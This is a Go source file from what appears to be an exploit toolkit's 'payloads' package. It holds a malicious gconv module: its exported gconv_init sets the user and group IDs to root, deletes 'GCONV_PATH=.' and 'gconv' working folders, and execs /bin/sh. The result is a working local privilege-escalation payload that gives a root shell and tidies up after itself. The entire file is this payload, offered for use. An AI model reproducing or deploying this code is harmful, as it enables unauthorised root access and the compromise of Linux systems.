package payloads

import "C"
import (
	"log"
	"os"
	"syscall"
)

//export gconv
func gconv() {}

//export gconv_init
func gconv_init() {
	if err := syscall.Setuid(0); err != nil {
		log.Fatalf("unable to setuid: %v", err)
	}
	if err := syscall.Setgid(0); err != nil {
		log.Fatalf("unable to setgid: %v", err)
	}
	if err := syscall.Seteuid(0); err != nil {
		log.Fatalf("unable to seteuid: %v", err)
	}
	if err := syscall.Setegid(0); err != nil {
		log.Fatalf("unable to setegid: %v", err)
	}
	err := os.Setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin")
	if err != nil {
		return
	}
	if err := os.RemoveAll("GCONV_PATH=."); err != nil {
		log.Printf("Unable to remove junk folder: %v", err)
	}
	if err := os.RemoveAll("gconv"); err != nil {
		log.Printf("Unable to remove junk folder: %v", err)
	}

	cmd := "sh"

	if err := syscall.Exec("/bin/sh", []string{"/bin/sh", "-c", cmd}, []string{"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"}); err != nil {
		log.Fatalf("unable to execute command '%s': %v", cmd, err)
	}

}
